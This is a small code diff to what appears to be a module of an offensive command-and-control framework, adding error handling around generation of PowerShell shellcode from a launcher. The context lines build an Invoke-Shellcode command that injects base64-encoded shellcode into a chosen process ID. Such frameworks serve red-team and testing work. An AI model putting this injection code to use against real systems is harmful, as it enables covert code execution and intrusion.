@@ -50,9 +50,12 @@ class Module:
                 return handle_error_message("[!] Error in launcher generation.")
             else:
                 launcher_code = launcher.split(" ")[-1]
-                sc = main_menu.stagers.generate_powershell_shellcode(
+                sc, err = main_menu.stagers.generate_powershell_shellcode(
                     launcher_code, arch
                 )
+                if err:
+                    return handle_error_message(err)
+
                 encoded_sc = helpers.encode_base64(sc)
 
         script_end = '\nInvoke-Shellcode -ProcessID {} -Shellcode $([Convert]::FromBase64String("{}")) -Force'.format(
